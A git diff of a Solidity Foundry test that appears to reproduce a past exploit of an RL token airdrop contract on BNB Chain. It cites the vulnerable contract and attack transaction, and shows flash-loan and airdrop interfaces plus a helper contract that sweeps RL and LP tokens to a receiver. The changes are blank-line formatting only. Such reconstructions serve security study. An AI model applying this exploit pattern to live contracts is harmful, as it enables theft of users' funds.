@@ -10,16 +10,21 @@ import "./../interface.sol";
 // Vulnerable Contract : https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888
 // Attack Tx  0xe15d261403612571edf8ea8be78458b88989cf1877f0b51af9159a76b74cb466
 interface IDODO {
+
     function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
 
     function _BASE_TOKEN_() external view returns (address);
+
 }
 
 interface RLLpIncentive {
+
     function distributeAirdrop(address user) external;
+
 }
 
 contract AirDropRewardContract {
+
     IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
     RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
     IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);
@@ -33,9 +38,11 @@ contract AirDropRewardContract {
         RL.transfer(receiver, RL.balanceOf(address(this)));
         Pair.transfer(receiver, Pair.balanceOf(address(this)));
     }
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
     RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
@@ -120,4 +127,5 @@ contract ContractTest is Test {
             contractAddress.push(_add);
         }
     }
+
 }
